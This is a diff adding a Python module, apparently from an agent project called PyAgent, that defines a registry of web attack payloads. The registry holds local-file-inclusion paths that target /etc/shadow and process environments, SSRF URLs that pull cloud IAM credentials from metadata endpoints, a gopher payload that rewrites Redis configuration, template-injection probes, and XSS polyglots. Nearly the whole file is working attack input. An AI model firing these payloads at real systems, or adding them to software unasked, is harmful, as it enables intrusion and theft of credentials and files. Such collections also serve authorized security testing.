@@ -1,0 +1,69 @@
+#!/usr/bin/env python3
+# Copyright 2026 PyAgent Authors
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+
+from typing import List, Dict
+
+class PayloadIntelligence:
+    """Consolidated registry of high-impact security payloads."""
+
+    LFI_PAYLOADS = [
+        "/etc/passwd",
+        "/etc/shadow",
+        "C:\\Windows\\win.ini",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "../../../../etc/passwd",
+        "..\\..\\..\\..\\Windows\\win.ini",
+        "/proc/self/environ",
+        "/var/log/apache2/access.log",
+        "php://filter/convert.base64-encode/resource=index.php"
+    ]
+
+    SSRF_PAYLOADS = [
+        "http://127.0.0.1:80",
+        "http://localhost:80",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://10.0.0.1:22",
+        "file:///etc/passwd",
+        "dict://127.0.0.1:6379/",
+        "gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$4%0d%0a/tmp/%0d%0a"
+    ]
+
+    SSTI_PAYLOADS = [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "#{7*7}",
+        "*{7*7}",
+        "{{self}}",
+        "{{config.items()}}",
+        "{{[].__class__.__base__.__subclasses__()}}"
+    ]
+
+    @staticmethod
+    def get_payloads(category: str) -> List[str]:
+        """Retrieve payloads for a specific category."""
+        category = category.upper()
+        if hasattr(PayloadIntelligence, f"{category}_PAYLOADS"):
+            return getattr(PayloadIntelligence, f"{category}_PAYLOADS")
+        return []
+
+    @staticmethod
+    def get_xss_polyglots() -> List[str]:
+        """Polyglot payloads that work in multiple contexts."""
+        return [
+            "jaVasCript:/*-/*`/*\\\"/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()>\\x3e",
+            "'\"><svg/onload=alert(1)>",
+            "javascript:alert(1)//"
+        ]
